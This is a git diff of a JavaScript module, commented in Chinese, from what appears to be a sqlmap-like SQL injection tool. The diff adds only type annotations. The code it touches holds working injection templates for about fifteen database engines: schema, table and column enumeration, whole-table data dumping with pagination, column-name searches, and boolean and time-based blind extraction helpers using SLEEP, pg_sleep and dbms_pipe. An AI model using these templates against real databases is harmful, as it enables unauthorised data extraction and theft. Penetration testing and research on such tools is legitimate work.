@@ -22,14 +22,17 @@ import { versionAtLeast } from './dbmsVersion.js';
 export const SYS_QUERIES = {
   MySQL: {
     databases: 'SELECT GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
+    /** @type {(db: string) => string} */
     tables: (db) =>
       `SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
+    /** @type {(db: string, table: string) => string} */
     columns: (db, table) =>
       `SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='${escSql(db)}' AND table_name='${escSql(table)}'`,
     // [P0-FIX 2026-09-09] 行分隔符必须显式声明：GROUP_CONCAT 默认用 ',' 连行，而解析器按
     // 0x1E 切行 → 整表被当成「一行」，列值按索引回填后跨行串列（实测 users 真实 5 行 → 落 1 行）。
     // [真库实测] MySQL 8.0.28 的 SEPARATOR 只接受**字面量**（SEPARATOR CHAR(30) 是 1064 语法
     // 错误），故用 hex 字面量 0x1E（=0x30-0x12? 不：0x1E 即十进制 30，行分隔符与解析器一致）。
+    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
       // [P0-FIX 2026-09-09 真库实测] 分页必须下推进子查询：聚合输出恒为 1 行，顶层 LIMIT/OFFSET
@@ -55,8 +58,10 @@ export const SYS_QUERIES = {
     // 忽略传入的 database 名，固定查 public，避免把 database 名当 schema 导致查空。
     tables: () =>
       `SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'`,
+    /** @type {(db: string, table: string) => string} */
     columns: (db, table) =>
       `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
+    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
       // [P0-FIX 2026-09-09] 同 MySQL：分页下推进子查询（聚合结果只有 1 行，顶层分页无意义）
@@ -69,8 +74,10 @@ export const SYS_QUERIES = {
   SQLite: {
     databases: null,
     tables: () => "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
+    /** @type {(db: string, table: string) => string} */
     columns: (db, table) => `SELECT group_concat(name) FROM pragma_table_info('${escSql(table)}')`,
     // SQLite 的 group_concat 仅接受单参数，列间用 ||CHAR(31)|| 拼接成单串后再聚合
+    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
       // [P0-FIX 2026-09-09] 用 escColsNNJoin 逐列包 NULL 安全表达式再以 CHAR(31) 连接。
@@ -81,8 +88,10 @@ export const SYS_QUERIES = {
   'SQL Server': {
     databases: 'SELECT string_agg(name, \',\') FROM sys.databases',
     tables: () => 'SELECT string_agg(table_name, \',\') FROM information_schema.tables',
+    /** @type {(db: string, table: string) => string} */
     columns: (db, table) =>
       `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
+    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
       // [P2-2 顺带修复] CONCAT → CONCAT_WS：CONCAT 不插入分隔符（列值会黏在一起，
@@ -101,11 +110,13 @@ export const SYS_QUERIES = {
     databases: "SELECT listagg(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users",
     tables: () =>
       'SELECT listagg(table_name, \',\') WITHIN GROUP (ORDER BY table_name) FROM user_tables',
+    /** @type {(db: string, table: string) => string} */
     columns: (db, table) =>
       `SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='${escSql(table)}'`,
     // [P0-FIX] Oracle 分页：用 ROWNUM 子查询包装支持 offset 偏移，替代原 ROWNUM<= 单页限制。
     // 旧模板仅 'WHERE ROWNUM<=' + limit，忽略 offset 造成大表拖库只能取前 limit 行。
     // [sqlmap 对标 --where] 有 where 时 ROWNUM 用 AND 拼接（WHERE 已存在），无 where 时用 WHERE。
+    /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
       // [P0-FIX 2026-09-09] 先对源表行做 ROWNUM 分页，再对取到的行聚合。
@@ -127,8 +138,11 @@ SYS_QUERIES.DM8 = SYS_QUERIES.Oracle;
 // ClickHouse 的 toString 函数把任意类型转为字符串，CHAR(31)/CHAR(30) 做列/行分隔符
 SYS_QUERIES.ClickHouse = {
   databases: "SELECT groupArray(name) FROM system.databases",
+  /** @type {(db: string) => string} */
   tables: (db) => `SELECT groupArray(name) FROM system.tables WHERE database='${escSql(db)}'`,
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) => `SELECT groupArray(name) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT arrayStringConcat(groupArray(CONCAT(${escCols(cols, 'ClickHouse')})), CHAR(30)) FROM (SELECT ${escCols(cols, 'ClickHouse')} FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}) __p`;
@@ -139,8 +153,10 @@ SYS_QUERIES.ClickHouse = {
 SYS_QUERIES.DB2 = {
   databases: "SELECT listagg(DB_NAME, ',') FROM TABLE(SYSPROC.ENV_GET_DB_INFO())",
   tables: () => "SELECT listagg(TABNAME, ',') FROM SYSCAT.TABLES WHERE TABSCHEMA NOT LIKE 'SYS%'",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT listagg(COLNAME, ',') FROM SYSCAT.COLUMNS WHERE TABNAME='${escSql(table)}' AND TABSCHEMA NOT LIKE 'SYS%'`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT listagg(CONCAT(CHAR(31), ${escCols(cols, 'DB2')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'DB2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
@@ -151,8 +167,10 @@ SYS_QUERIES.DB2 = {
 SYS_QUERIES.HSQLDB = {
   databases: "SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM INFORMATION_SCHEMA.SYSTEM_SCHEMAS",
   tables: () => "SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${escSql(table)}'`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'HSQLDB')}) SEPARATOR CHAR(30)) FROM (SELECT ${escCols(cols, 'HSQLDB')} FROM \`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}) __p`;
@@ -163,8 +181,10 @@ SYS_QUERIES.HSQLDB = {
 SYS_QUERIES.Derby = {
   databases: "SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
   tables: () => "SELECT GROUP_CONCAT(TABLENAME) FROM SYS.SYSTABLES WHERE TABLETYPE='T'",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT GROUP_CONCAT(COLUMNNAME) FROM SYS.SYSCOLUMNS WHERE REFERENCEID=(SELECT TABLEID FROM SYS.SYSTABLES WHERE TABLENAME='${escSql(table)}')`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'Derby')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'Derby')} FROM "${escDq(table)}"${w} OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY) __p`;
@@ -180,10 +200,12 @@ SYS_QUERIES.Derby = {
 SYS_QUERIES.Sybase = {
   databases: "SELECT list(name) FROM master.dbo.sysdatabases",
   tables: () => "SELECT list(name) FROM sysobjects WHERE type='U'",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT list(name) FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='${escSql(table)}')`,
   // [FIX] Sybase ASE 的 TOP / START AT 属于 SELECT 子句，必须紧跟 SELECT 而非放在 FROM 之后。
   // 旧模板拼成 `... FROM [table] WHERE ... TOP n START AT m`，在 ASE 上是语法错误（拖库必然失败）。
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     // [P0-FIX 2026-09-09] TOP/START AT 下推进子查询：顶层 TOP 作用在聚合结果（恒 1 行）上无意义
@@ -202,8 +224,10 @@ SYS_QUERIES.Firebird = {
   databases: null,
   tables: () =>
     "SELECT list(rdb$relation_name) FROM rdb$relations WHERE rdb$system_flag=0 AND rdb$view_blr IS NULL",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT list(rdb$field_name) FROM rdb$relation_fields WHERE rdb$relation_name='${escSql(table)}'`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT list(ASCII_CHAR(31) || ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')}, ASCII_CHAR(30)) FROM (SELECT ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')} FROM "${escDq(table)}"${w} ROWS (${offset + 1}) TO (${offset + limit})) __p`;
@@ -217,6 +241,7 @@ SYS_QUERIES.Informix = {
   databases: "SELECT list(dbsname) FROM sysmaster:sysdatabases",
   tables: () =>
     "SELECT list(tabname) FROM systables WHERE tabtype='T' AND tabid > 99",
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT list(colname) FROM syscolumns WHERE tabid=(SELECT tabid FROM systables WHERE tabname='${escSql(table)}')`,
   data: null,
@@ -225,10 +250,13 @@ SYS_QUERIES.Informix = {
 // H2：GROUP_CONCAT + CHAR()（与 HSQLDB 类似，H2 兼容 MySQL 语法）
 SYS_QUERIES.H2 = {
   databases: "SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
+  /** @type {(db: string) => string} */
   tables: (db) =>
     `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'H2')}) SEPARATOR CHAR(30)) FROM (SELECT ${escCols(cols, 'H2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
@@ -247,10 +275,13 @@ SYS_QUERIES.Access = {
 // MonetDB：group_concat + CHAR()（MonetDB 支持 group_concat 和 CHAR 函数）
 SYS_QUERIES.MonetDB = {
   databases: "SELECT group_concat(name) FROM sys.schemas",
+  /** @type {(db: string) => string} */
   tables: (db) =>
     `SELECT group_concat(name) FROM sys.tables WHERE schema_id=(SELECT id FROM sys.schemas WHERE name='${escSql(db)}')`,
+  /** @type {(db: string, table: string) => string} */
   columns: (db, table) =>
     `SELECT group_concat(name) FROM sys.columns WHERE table_id=(SELECT id FROM sys.tables WHERE name='${escSql(table)}')`,
+  /** @type {(db: string, table: string, cols: string[], limit: number, offset: number, where: string|null) => string} */
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
     return `SELECT group_concat(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'MonetDB')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'MonetDB')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
@@ -260,54 +291,96 @@ SYS_QUERIES.MonetDB = {
 // 各库盲注二分提取函数（LENGTH / SUBSTRING / ASCII 等方言变体）
 // [⑯] 补全 10 库盲注二分函数（MariaDB/TiDB/DM8 经 resolveDbms 归一化到 MySQL/Oracle）
 export const LEN_FN = {
+  /** @type {(e: string) => string} */
   MySQL: (e) => `LENGTH((${e}))`,
+  /** @type {(e: string) => string} */
   PostgreSQL: (e) => `LENGTH((${e}))`,
+  /** @type {(e: string) => string} */
   SQLite: (e) => `LENGTH((${e}))`,
   'SQL Server': (e) => `LEN((${e}))`,
+  /** @type {(e: string) => string} */
   Oracle: (e) => `LENGTH((${e}))`,
+  /** @type {(e: string) => string} */
   ClickHouse: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   Sybase: (e) => `len((${e}))`,
+  /** @type {(e: string) => string} */
   DB2: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   Firebird: (e) => `char_length((${e}))`,
+  /** @type {(e: string) => string} */
   Informix: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   H2: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   Access: (e) => `len((${e}))`,
+  /** @type {(e: string) => string} */
   HSQLDB: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   Derby: (e) => `length((${e}))`,
+  /** @type {(e: string) => string} */
   MonetDB: (e) => `length((${e}))`,
 };
 export const SUB_FN = {
+  /** @type {(e: string, i: string) => string} */
   MySQL: (e, i) => `SUBSTRING((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   PostgreSQL: (e, i) => `SUBSTRING((${e}) FROM ${i} FOR 1)`,
+  /** @type {(e: string, i: string) => string} */
   SQLite: (e, i) => `SUBSTR((${e}),${i},1)`,
   'SQL Server': (e, i) => `SUBSTRING((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   Oracle: (e, i) => `SUBSTR((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   ClickHouse: (e, i) => `substring((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   Sybase: (e, i) => `substring((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   DB2: (e, i) => `substr((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   Firebird: (e, i) => `substring((${e}) FROM ${i} FOR 1)`,
+  /** @type {(e: string, i: string) => string} */
   Informix: (e, i) => `substr((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   H2: (e, i) => `substring((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   Access: (e, i) => `mid((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   HSQLDB: (e, i) => `substring((${e}),${i},1)`,
+  /** @type {(e: string, i: string) => string} */
   Derby: (e, i) => `substring((${e}) FROM ${i} FOR 1)`,
+  /** @type {(e: string, i: string) => string} */
   MonetDB: (e, i) => `substring((${e}),${i},1)`,
 };
 export const ASCII_FN = {
+  /** @type {(c: string) => string} */
   MySQL: (c) => `ASCII(${c})`,
+  /** @type {(c: string) => string} */
   PostgreSQL: (c) => `ASCII(${c})`,
+  /** @type {(c: string) => string} */
   SQLite: (c) => `UNICODE(${c})`,
   'SQL Server': (c) => `ASCII(${c})`,
+  /** @type {(c: string) => string} */
   Oracle: (c) => `ASCII(${c})`,
+  /** @type {(c: string) => string} */
   ClickHouse: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   Sybase: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   DB2: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   Firebird: (c) => `ascii_val(${c})`,
+  /** @type {(c: string) => string} */
   Informix: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   H2: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   Access: (c) => `asc(${c})`,
+  /** @type {(c: string) => string} */
   HSQLDB: (c) => `ascii(${c})`,
+  /** @type {(c: string) => string} */
   Derby: (c) => `unicode(${c})`,
+  /** @type {(c: string) => string} */
   MonetDB: (c) => `ascii(${c})`,
 };
 
@@ -341,14 +414,20 @@ export const VERSION_EXPR = {
 // 调用方降级布尔通道（诚实边界，与 sqlmap 对无延迟原语库的降级策略一致）。
 // P2-P5：延迟秒数由调用方传入（config.timeBlindSleepSec，默认 2），替代硬编码 3s。
 export const TIME_COND = {
+  /** @type {(c: string, sec: number) => string} */
   MySQL: (c, sec = 2) => `IF((${c}), SLEEP(${sec}), 0)`,
+  /** @type {(c: string, sec: number) => string} */
   PostgreSQL: (c, sec = 2) => `(CASE WHEN (${c}) THEN pg_sleep(${sec}) ELSE 0 END)`,
+  /** @type {(c: string, sec: number) => string} */
   Oracle: (c, sec = 2) => `(CASE WHEN (${c}) THEN dbms_pipe.receive_message('sqli',${sec}) ELSE 0 END)`,
   // [⑯] ClickHouse：sleep() 函数 + if() 三元表达式（CH 函数名小写）
+  /** @type {(c: string, sec: number) => string} */
   ClickHouse: (c, sec = 2) => `if((${c}), sleep(${sec}), 0)`,
   // [P1] H2：内建 SLEEP(ms)（{SLEEP}000 秒->毫秒），返回 0；CASE WHEN 条件延迟
+  /** @type {(c: string, sec: number) => string} */
   H2: (c, sec = 2) => `(CASE WHEN (${c}) THEN SLEEP(${sec}000) ELSE 0 END)`,
   // [P1] MonetDB：内建 sys.sleep(sec)（单位秒），返回 NULL/整数值因版本而异
+  /** @type {(c: string, sec: number) => string} */
   MonetDB: (c, sec = 2) => `(CASE WHEN (${c}) THEN sys.sleep(${sec}) ELSE 0 END)`,
   // Sybase/SQL Server 的 WAITFOR DELAY 是语句级，不能在 SELECT 表达式中使用 -> null（降级布尔通道）
   // Sybase 时间盲注检测走 PAYLOADS.Sybase.time 堆叠模板，数据提取降级布尔
@@ -434,16 +513,21 @@ ISDBA_QUERY.MonetDB = null;
 // 枚举 schema（表结构/列定义）查询表达式（对标 sqlmap --schema）：
 // 返回列定义元数据（列名、类型、可空、默认值），行分隔符 CHAR(30)，列分隔符 CHAR(31)。
 export const SCHEMA_QUERY = {
+  /** @type {(db: string, table: string) => string} */
   MySQL: (db, table) =>
     `SELECT GROUP_CONCAT(COLUMN_NAME,CHAR(31),COLUMN_TYPE,CHAR(31),IS_NULLABLE,CHAR(31),IFNULL(COLUMN_DEFAULT,'NULL') SEPARATOR CHAR(30)) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='${escSql(db)}' AND TABLE_NAME='${escSql(table)}'`,
+  /** @type {(db: string, table: string) => string} */
   PostgreSQL: (db, table) =>
     `SELECT string_agg(column_name||' '||data_type||CASE WHEN character_maximum_length IS NOT NULL THEN '('||character_maximum_length||')' ELSE '' END, CHR(30)) FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
   'SQL Server': (db, table) =>
     `SELECT string_agg(CONCAT(COLUMN_NAME,CHAR(31),DATA_TYPE,CHAR(31),IS_NULLABLE,CHAR(31),ISNULL(COLUMN_DEFAULT,'NULL')), CHAR(30)) FROM information_schema.columns WHERE table_name='${escSql(table)}' AND TABLE_SCHEMA='dbo'`,
+  /** @type {(table: string) => string} */
   SQLite: (table) =>
     `SELECT group_concat(name||' '||type) FROM pragma_table_info('${escSql(table)}')`,
+  /** @type {(db: string, table: string) => string} */
   Oracle: (db, table) =>
     `SELECT listagg(column_name||' '||data_type, CHR(30)) WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='${escSql(table)}'`,
+  /** @type {(db: string, table: string) => string} */
   ClickHouse: (db, table) =>
     `SELECT arrayStringConcat(groupArray(CONCAT(toString(name),CHAR(31),toString(type))), CHAR(30)) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
 };
@@ -506,30 +590,41 @@ export const CURRENT_USER_EXPR = {
 // SQLite 用 sqlite_master（表搜索）+ 逐表 pragma_table_info（列搜索，返回 null 由调用方迭代）。
 // ============================================================================
 export const SEARCH_COLUMNS_QUERY = {
+  /** @type {(searchTerm: string) => string} */
   MySQL: (searchTerm) =>
     `SELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name, '.', column_name) SEPARATOR ',') FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   PostgreSQL: (searchTerm) =>
     `SELECT string_agg(table_schema || '.' || table_name || '.' || column_name, ',') FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
   'SQL Server': (searchTerm) =>
     `SELECT string_agg(TABLE_SCHEMA + '.' + TABLE_NAME + '.' + COLUMN_NAME, ',') FROM information_schema.columns WHERE COLUMN_NAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Oracle: (searchTerm) =>
     `SELECT listagg(owner || '.' || table_name || '.' || column_name, ',') WITHIN GROUP (ORDER BY owner, table_name, column_name) FROM all_tab_columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
   // SQLite 无 information_schema，pragma_table_info 需逐表查询 -> null，由 searchColumns 迭代处理
   SQLite: null,
+  /** @type {(searchTerm: string) => string} */
   ClickHouse: (searchTerm) =>
     `SELECT groupArray(concat(database, '.', table, '.', name)) FROM system.columns WHERE name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   DB2: (searchTerm) =>
     `SELECT listagg(TABSCHEMA || '.' || TABNAME || '.' || COLNAME, ',') FROM SYSCAT.COLUMNS WHERE COLNAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Sybase: (searchTerm) =>
     `SELECT list(db_name() || '.' || so.name || '.' || sc.name) FROM syscolumns sc, sysobjects so WHERE sc.id=so.id AND sc.name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Firebird: (searchTerm) =>
     `SELECT list(rdb$relation_name || '.' || rdb$field_name) FROM rdb$relation_fields WHERE rdb$field_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   H2: (searchTerm) =>
     `SELECT GROUP_CONCAT(table_schema || '.' || table_name || '.' || column_name) FROM information_schema.columns WHERE column_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   HSQLDB: (searchTerm) =>
     `SELECT GROUP_CONCAT(TABLE_SCHEMA || '.' || TABLE_NAME || '.' || COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   MonetDB: (searchTerm) =>
     `SELECT group_concat(s.name || '.' || t.name || '.' || c.name) FROM sys.columns c, sys.tables t, sys.schemas s WHERE c.table_id=t.id AND t.schema_id=s.id AND c.name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Informix: (searchTerm) =>
     `SELECT list(t.tabname || '.' || c.colname) FROM syscolumns c, systables t WHERE c.tabid=t.tabid AND t.tabid>99 AND c.colname LIKE '%${escSql(searchTerm)}%'`,
   Access: null, // 无 information_schema，不支持跨表列搜索
@@ -541,30 +636,42 @@ SEARCH_COLUMNS_QUERY.TiDB = SEARCH_COLUMNS_QUERY.MySQL;
 SEARCH_COLUMNS_QUERY.DM8 = SEARCH_COLUMNS_QUERY.Oracle;
 
 export const SEARCH_TABLES_QUERY = {
+  /** @type {(searchTerm: string) => string} */
   MySQL: (searchTerm) =>
     `SELECT GROUP_CONCAT(CONCAT(table_schema, '.', table_name) SEPARATOR ',') FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   PostgreSQL: (searchTerm) =>
     `SELECT string_agg(table_schema || '.' || table_name, ',') FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
   'SQL Server': (searchTerm) =>
     `SELECT string_agg(TABLE_SCHEMA + '.' + TABLE_NAME, ',') FROM information_schema.tables WHERE TABLE_NAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Oracle: (searchTerm) =>
     `SELECT listagg(owner || '.' || table_name, ',') WITHIN GROUP (ORDER BY owner, table_name) FROM all_tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   SQLite: (searchTerm) =>
     `SELECT group_concat(name) FROM sqlite_master WHERE type='table' AND name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   ClickHouse: (searchTerm) =>
     `SELECT groupArray(concat(database, '.', name)) FROM system.tables WHERE name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   DB2: (searchTerm) =>
     `SELECT listagg(TABSCHEMA || '.' || TABNAME, ',') FROM SYSCAT.TABLES WHERE TABNAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Sybase: (searchTerm) =>
     `SELECT list(db_name() || '.' || name) FROM sysobjects WHERE type='U' AND name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Firebird: (searchTerm) =>
     `SELECT list(rdb$relation_name) FROM rdb$relations WHERE rdb$system_flag=0 AND rdb$relation_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   H2: (searchTerm) =>
     `SELECT GROUP_CONCAT(table_schema || '.' || table_name) FROM information_schema.tables WHERE table_name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   HSQLDB: (searchTerm) =>
     `SELECT GROUP_CONCAT(TABLE_SCHEMA || '.' || TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   MonetDB: (searchTerm) =>
     `SELECT group_concat(s.name || '.' || t.name) FROM sys.tables t, sys.schemas s WHERE t.schema_id=s.id AND t.name LIKE '%${escSql(searchTerm)}%'`,
+  /** @type {(searchTerm: string) => string} */
   Informix: (searchTerm) =>
     `SELECT list(tabname) FROM systables WHERE tabtype='T' AND tabid>99 AND tabname LIKE '%${escSql(searchTerm)}%'`,
   Access: null,
@@ -580,33 +687,46 @@ SEARCH_TABLES_QUERY.DM8 = SEARCH_TABLES_QUERY.Oracle;
 // WHERE 子句原样拼接（--where 是用户提供的 SQL 片段，不对 WHERE 内容做转义，与 sqlmap 行为一致）。
 // ============================================================================
 export const COUNT_WHERE_QUERY = {
+  /** @type {(db: string, table: string, where: string|null) => string} */
   MySQL: (db, table, where) =>
     `SELECT COUNT(*) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\` WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   PostgreSQL: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
   'SQL Server': (db, table, where) =>
     `SELECT COUNT(*) FROM [${escBracket(table)}] WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   Oracle: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   SQLite: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   ClickHouse: (db, table, where) =>
     `SELECT COUNT(*) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\` WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   DB2: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   Sybase: (db, table, where) =>
     `SELECT COUNT(*) FROM [${escBracket(table)}] WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   Firebird: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   H2: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   HSQLDB: (db, table, where) =>
     `SELECT COUNT(*) FROM \`${escBacktick(table)}\` WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   MonetDB: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   Informix: (db, table, where) =>
     `SELECT COUNT(*) FROM "${escDq(table)}" WHERE ${where}`,
   Access: null,
+  /** @type {(db: string, table: string, where: string|null) => string} */
   Derby: (db, table, where) =>
